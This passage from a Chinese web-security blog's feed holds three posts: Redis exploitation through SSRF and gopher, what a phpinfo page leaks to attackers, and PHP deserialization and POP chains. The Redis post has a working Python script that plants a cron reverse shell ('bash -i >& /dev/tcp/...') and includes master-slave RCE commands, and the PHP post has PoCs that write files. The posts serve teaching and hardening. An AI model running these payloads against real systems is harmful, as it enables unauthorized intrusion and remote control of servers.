alt="img"></a></p><p>注：需要将内容再进行一次url编码传到web的参数中才会正常运行</p><p>使用ssrf端口探测的时候，不要拘泥于http协议，还可以使用dict协议来进行探测</p><p>利用gopher协议反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">/*gopher协议反弹shell利用脚本*/</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;192.168.127.140&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">reverse_ip=<span class="string">&quot;192.168.127.131&quot;</span></span><br><span class="line">reverse_port=<span class="string">&quot;7777&quot;</span></span><br><span class="line">cron=<span class="string">&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;</span>%(reverse_ip,reverse_port)</span><br><span class="line">filename=<span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/spool/cron&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">   <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(cron.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">   <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">   <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">   <span class="string">&quot;save&quot;</span></span><br><span class="line">   ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">  cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">  CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">  redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">  cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">    cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">  cmd+=CRLF</span><br><span class="line">  <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += urllib.quote(redis_format(x))</span><br><span class="line">  <span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181438636-1255491191.png"><img src="1344396-20210102181438636-1255491191.png" alt="img"></a></strong></p><p>redis如果有密码，是弱口令的话，可以通过python脚本爆破，看回显来确定密码是否正确</p><p>如果有口令在最前面，和gopher的格式一样，如下健为AUTH，密码为123456</p><p><strong><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102181808754-1675763347.png"><img src="1344396-20210102181808754-1675763347.png" alt="img"></a></strong></p><p>爆破的时候需要在寻常的未授权前加上认证的gopher字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0D%0A</span><br></pre></td></tr></table></figure><p>爆破成功的化可以直接结合gopher协议对redis进行写shell的操作。</p><p>这里结合上面的redis主从复制的RCE来执行命令，先来构造加载exp.so的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp/</span><br><span class="line">config set dbfilename /tmp/</span><br><span class="line">slaveof 192.168.127.140 4444</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">system.exec &#x27;whoami&#x27;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102182908032-751922075.png"><img src="1344396-20210102182908032-751922075.png" alt="img"></a></p><p>这样就可以加载本地的exp.so对redis进行爆破，如果爆破成功就执行whoami命令。</p><p>这里只是一种演示，使用此方法同样可以写shell，写计划任务来获取shell。</p><h1 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h1><h3 id="修复办法"><a href="#修复办法" class="headerlink" title="修复办法"></a>修复办法</h3><p>（1）禁止公网开放Redis端口,可以在防火墙上禁用6379 Redis的端口</p><p>（2）检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）</p><p>（3）增加 Redis 密码验证</p><p> 首先停止REDIS服务，打开redis.conf配置文件（不同的配置文件，其路径可能不同）/etc/redis/6379.conf,找到# requirepass foobared去掉前面的#号，然后将foobared改为自己设定的密码，重启启动redis服务。</p><p>（4）修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问）。</p><h3 id="可参考加固修改命令"><a href="#可参考加固修改命令" class="headerlink" title="可参考加固修改命令"></a>可参考加固修改命令</h3><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>port</td><td>修改redis使用的默认端口</td></tr><tr><td>bind</td><td>设定redis监听的专用IP</td></tr><tr><td>requirepass</td><td>设定redis连接的密码</td></tr><tr><td>rename-command CONFIG “”</td><td>禁用CONFIG命令</td></tr><tr><td>rename-command info info2</td><td>重命名info为info2</td></tr></tbody></table><p>参考文章</p><blockquote><p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/12230858.html">https://www.cnblogs.com/Xy--1/p/12230858.html</a></p><p><a href="http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1">http://blog.csdn.net/Hu_wen/article/details/55189777?locationNum=15&amp;fps=1</a></p><p><a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p><p><a href="http://www.jianshu.com/p/e550628ba1bc">http://www.jianshu.com/p/e550628ba1bc</a></p><p><a href="https://www.cnblogs.com/0daybug/p/12389138.html">https://www.cnblogs.com/0daybug/p/12389138.html</a></p><p><a href="https://www.webshell.cc/5154.html">https://www.webshell.cc/5154.html</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 漏洞总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo信息利用</title>
      <link href="/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/"/>
      <url>/2021/07/28/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>phpinfo信息利用</p><span id="more"></span><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><h4 id="system-系统信息"><a href="#system-系统信息" class="headerlink" title="system:系统信息"></a>system:系统信息</h4><p><img src="image-20210728150900924.png" alt="image-20210728150900924"></p><h4 id="extension-dir-php扩展的路径"><a href="#extension-dir-php扩展的路径" class="headerlink" title="extension_dir:php扩展的路径"></a><strong>extension_dir:php扩展的路径</strong></h4><p><img src="image-20210728151221382.png" alt="image-20210728151221382"></p><h4 id="SERVER-‘HTTP-HOST’-网站真实IP"><a href="#SERVER-‘HTTP-HOST’-网站真实IP" class="headerlink" title="$_SERVER[‘HTTP_HOST’]:网站真实IP"></a>$_SERVER[‘HTTP_HOST’]:网站真实IP</h4><p><img src="image-20210728151415306.png" alt="image-20210728151415306"></p><h3 id="有关目录的"><a href="#有关目录的" class="headerlink" title="有关目录的"></a>有关目录的</h3><h4 id="SERVER-‘DOCUMENT-ROOT’-web根目录"><a href="#SERVER-‘DOCUMENT-ROOT’-web根目录" class="headerlink" title="$_SERVER[‘DOCUMENT_ROOT’]:web根目录"></a>$_SERVER[‘DOCUMENT_ROOT’]:web根目录</h4><p><img src="image-20210728151507429.png" alt="image-20210728151507429"></p><h4 id="SERVER-‘SCRIPT-FILENAME’-index-php根目录"><a href="#SERVER-‘SCRIPT-FILENAME’-index-php根目录" class="headerlink" title="**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录"></a>**$_SERVER[‘SCRIPT_FILENAME’]**index.php根目录</h4><p><img src="image-20210803151453564.png" alt="image-20210803151453564"></p><h4 id="SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录"><a href="#SERVER-‘CONTEXT-DOCUMENT-ROOT’-前运行脚本所在的文档根目录" class="headerlink" title="**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录"></a>**$_SERVER[‘CONTEXT_DOCUMENT_ROOT’]**前运行脚本所在的文档根目录</h4><p><img src="image-20210803151510199.png" alt="image-20210803151510199"></p><h4 id="session-save-path-session的存储路径"><a href="#session-save-path-session的存储路径" class="headerlink" title="session.save_path   session的存储路径"></a><strong>session.save_path</strong>   session的存储路径</h4><p><img src="image-20210803151800423.png" alt="image-20210803151800423"></p><h4 id="APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径"><a href="#APACHE-RUN-DIR-和-APACHE-PID-FILE-APACHE的路径" class="headerlink" title="APACHE_RUN_DIR  和 APACHE_PID_FILE   APACHE的路径"></a><strong>APACHE_RUN_DIR</strong>  和 <strong>APACHE_PID_FILE</strong>   APACHE的路径</h4><p><img src="image-20210803152631954.png" alt="image-20210803152631954"></p><p><img src="image-20210803152913592.png" alt="image-20210803152913592"></p><p><img src="image-20210803152937985.png" alt="image-20210803152937985"></p><p><img src="image-20210803153211410.png" alt="image-20210803153211410"></p><h4 id="pdo-mysql-default-socket"><a href="#pdo-mysql-default-socket" class="headerlink" title="pdo_mysql.default_socket"></a><strong>pdo_mysql.default_socket</strong></h4><p><img src="image-20210803153014374.png" alt="image-20210803153014374"></p><h4 id="临时文件目录"><a href="#临时文件目录" class="headerlink" title="临时文件目录"></a>临时文件目录</h4><p><img src="image-20210728151841301.png" alt="image-20210728151841301"></p><p>phpinfo()页面post一个shell，可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了</p><h1 id="重要配置"><a href="#重要配置" class="headerlink" title="重要配置"></a>重要配置</h1><h4 id="allow-url-include-远程文件包含"><a href="#allow-url-include-远程文件包含" class="headerlink" title="allow_url_include:远程文件包含"></a>allow_url_include:远程文件包含</h4><p><img src="image-20210728152037075.png" alt="image-20210728152037075"></p><h4 id="disable-functions-表示禁用的函数"><a href="#disable-functions-表示禁用的函数" class="headerlink" title="disable_functions:表示禁用的函数"></a>disable_functions:表示禁用的函数</h4><p><img src="image-20210728152223602.png" alt="image-20210728152223602"></p><p>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p><h4 id="asp-tags-php标签-php7以下版本有"><a href="#asp-tags-php标签-php7以下版本有" class="headerlink" title="asp_tags:php标签(php7以下版本有)"></a><strong>asp_tags:php标签</strong>(php7以下版本有)</h4><p><img src="image-20210728152325831.png" alt="image-20210728152325831"></p><p>有4种形式如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的</p><p><img src="image-20210728152402171.png" alt="image-20210728152402171"></p><h4 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a><strong>short_open_tag</strong></h4><p><img src="image-20210728152440576.png" alt="image-20210728152440576"></p><p>允许<??>这种形式，并且&lt;?=等价于&lt;? echo</p><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc:"></a>magic_quotes_gpc:</h4><p><img src="image-20210728153125839.png" alt="image-20210728153125839"></p><p>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御</p><p>php5.4以下版本有的函数，默认开启，会对特殊字符进行转yi</p><blockquote><p>参考</p><p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞总结</title>
      <link href="/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2021/07/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>为了有效存储和传递数据同时不丢失类型和结构 需要利用序列化和反序列化函数对数据进行处理<br>序列化函数返回字符串 字符串包含了表示值的字节流可以存储于任何地方<br>反序列化函数对于单一的已序列化的变量进行操作 将其转换为原来的值<br>二者结合可以轻松存储数据 使程序更具维护性</p><span id="more"></span><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h1 id="serialize函数"><a href="#serialize函数" class="headerlink" title="serialize函数"></a>serialize函数</h1><p>是序列化函数，序列化对象时 PHP在序列化动作之前调用成员函数__sleep 这样就允许对象在被序列化之前做任何清除操作。<br><strong>类型字母详解:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a - array  </span><br><span class="line">b - boolean  </span><br><span class="line">d - double  </span><br><span class="line">i - integer</span><br><span class="line">o - common object</span><br><span class="line">r - reference</span><br><span class="line">s - string</span><br><span class="line">C - custom object</span><br><span class="line">O - class</span><br><span class="line">N - null</span><br><span class="line">R - pointer reference</span><br><span class="line">U - unicode string</span><br></pre></td></tr></table></figure><p>boolean</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b:;</span><br><span class="line">b:1; // True</span><br><span class="line">b:0; // False</span><br></pre></td></tr></table></figure><p>integer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i:;</span><br><span class="line">i:1; // 1</span><br><span class="line">i:-3; // -3</span><br></pre></td></tr></table></figure><p>double</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d:;</span><br><span class="line">d:1.2345600000000001; // 1.23456（php弱类型所造成的四舍五入现象）</span><br></pre></td></tr></table></figure><p>NULL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N; //NULL</span><br></pre></td></tr></table></figure><p>string</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s::&quot;&quot;;</span><br><span class="line">s&quot;PALEONEC&quot;; // &quot;PALEONEC&quot;</span><br></pre></td></tr></table></figure><p>array</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a::&#123;key, value pairs&#125;;</span><br><span class="line">a&#123;s&quot;key1&quot;;s&quot;value1&quot;;s&quot;value2&quot;;&#125; // array(&quot;key1&quot; =&gt; &quot;value1&quot;, &quot;key2&quot; =&gt; &quot;value2&quot;)</span><br></pre></td></tr></table></figure><p>类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:5:&quot;Hello&quot;;s:1:&quot;b&quot;;i:20;&#125;</span><br><span class="line">类型:长度:&quot;名字&quot;:类中变量的个数:&#123;类型:长度:&quot;名字&quot;;类型:长度:&quot;值&quot;;......&#125;</span><br></pre></td></tr></table></figure><p>注：对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。<br>所以在传入序列化字符串的时候，需要补齐这些空字节。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;%00test%00flag&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Active&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h1 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h1><p>是反序列化函数，若被序列化的变量是一个对象，重新构造对象之后会自动调用__wakeup成员函数</p><p>举个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test = &quot;demo&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;test&#x27;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这串代码，我们可以看到变量<code>$a</code>从url中test参数获取到内容，并且在反序列化的时候通过<code>__destruct()</code>直接将传入的数据不经过任何处理，echo出来，这里就存在反射型xss漏洞了。</p><p>在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 “面向属性编程” ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的ROP技术类似。在ROP中我们往往需要一段初始化gadgets来开始我们的整个利用过程,然后继续调用其他gadgets。在PHP反序列化漏洞利用技术POP中,对应的初始化gadgets就是<code>__wakeup()</code> 或者是<code>__destruct()</code> 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.unserialize函数的参数可控<br>2.存在魔法函数<br>总结几个常用魔术方法及触发条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="1-几个可用的POP链方法"><a href="#1-几个可用的POP链方法" class="headerlink" title="1.几个可用的POP链方法"></a>1.几个可用的POP链方法</h2><p>命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure><p>文件操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure><p>如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.</p><h2 id="2-POP链demo示例"><a href="#2-POP链demo示例" class="headerlink" title="2.POP链demo示例"></a>2.POP链demo示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;demo\n&quot;;</span><br><span class="line">    private $filename = &#x27;./demo&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(file_get_contents(&#x27;./serialized.txt));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是一个很简单的示例代码，且这个代码存在反序列化漏洞。该文件还定义了一个 popdemo 类,并且该类实现了 <code>__wakeup</code> 函数,然后在该函数中又调用了save函数，且参数对象是文件名。跟进save函数，我们看到在该函数中通过调用<code>file_put_contents</code>函数，这个函数的<code>$filename</code>和<code>data</code>属性值是从save函数中传出来的，并且创建了一个文件。由于<code>__wakeup()</code>函数在序列化时自动调用，这里还定义了一个保存文件的函数，在这个反序列化过程中对象的属性值可控。于是这里就存在一个任意文件写入任意文件内容的反序列化漏洞了。这就是所谓的POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的Web漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了对象中的属性值。</p><p>利用poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;&lt;?php phpinfo();?&gt;\n&quot;;</span><br><span class="line">    private $filename = &#x27;./poc.php&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$demo = new popdemo();</span><br><span class="line">echo serialize($demo);</span><br><span class="line">file_put_contents(&quot;./serialized.txt&quot;,serialize($demo));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里定义了<code>$data</code>和<code>$filename</code>，然后序列化字符串后存储到serialized.txt文件中，序列化字符串：</p><p><img src="hao2m.png" alt="4"></p><p>然后运行demo代码，会在同目录下生成一个poc.php</p><p><img src="tzldu.png" alt="5"></p><h1 id="反序列化漏洞的利用"><a href="#反序列化漏洞的利用" class="headerlink" title="反序列化漏洞的利用"></a>反序列化漏洞的利用</h1><h2 id="1-利用构造函数等"><a href="#1-利用构造函数等" class="headerlink" title="1.利用构造函数等"></a>1.利用构造函数等</h2><p>php在使用unserialize()后会导致<code>__wakeup()</code> 或<code>__destruct()</code>的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<code>__wakeup()</code> 或<code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pocdemo&#123;</span><br><span class="line">    function __construct($test)&#123;</span><br><span class="line">        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">        fwrite($fp,$test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = file_get_contents(&#x27;./ser.txt&#x27;);</span><br><span class="line">unserialize($test);</span><br><span class="line"></span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里代码主要是通过get方法通过test传入序列化好的字符串，然后在反序列化的时候自动调用<code>__wakeup()</code>函数，在<code>__wakeup()</code>函数中通过new pocdemo()会自动调用对象pocdemo中的<code>__construct()</code>，从而把<code>&lt;?php phpinfo(); ?&gt;</code>写入到shell.php中。</p><p>poc代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = new l1nk3r();</span><br><span class="line">$result = serialize($ser);</span><br><span class="line">print $result;</span><br><span class="line">file_put_contents(&#x27;./ser.txt&#x27;,$result);</span><br><span 